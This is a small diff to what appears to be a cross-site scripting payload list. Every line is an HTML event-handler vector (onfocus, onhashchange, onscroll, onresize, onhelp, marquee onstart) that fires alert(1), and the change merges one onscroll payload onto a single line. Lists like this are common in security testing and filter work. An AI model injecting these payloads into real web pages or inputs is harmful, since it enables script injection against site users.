@@ -3,9 +3,7 @@
 <body onfocus=alert(1)>
 <body onhashchange=alert(1)><a href=%23x>click this!#x
 <body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x
-<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br>
-<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
-<br><x id=x>#x
+<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><x id=x>#x
 <body onresize=alert(1)>press F12!
 <body onhelp=alert(1)>press F1!
 <marquee onstart=alert(1)>
